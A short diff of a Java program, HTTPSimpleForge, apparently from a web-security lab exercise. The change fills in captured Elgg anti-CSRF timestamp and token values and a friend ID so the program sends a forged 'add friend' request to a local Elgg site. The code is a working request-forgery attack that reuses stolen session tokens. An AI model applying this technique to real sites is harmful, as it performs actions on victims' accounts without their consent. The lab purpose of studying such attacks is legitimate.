@@ -5,10 +5,10 @@ public class HTTPSimpleForge {
 		try {
 			int responseCode;
 			InputStream responseIn=null;
-			String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";
+			String requestDetails = "&__elgg_ts=1603891706&__elgg_token=9dcd886e223c4bc8adb552c4d0546e78";
 
 			// URL to be forged.
-			URL url = new URL ("http://localhost:8082/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);
+			URL url = new URL ("http://localhost:8082/action/friends/add?friend=40"+requestDetails);
 
 			// URLConnection instance is created to further parameterize a
 			// resource request past what the state members of URL instance
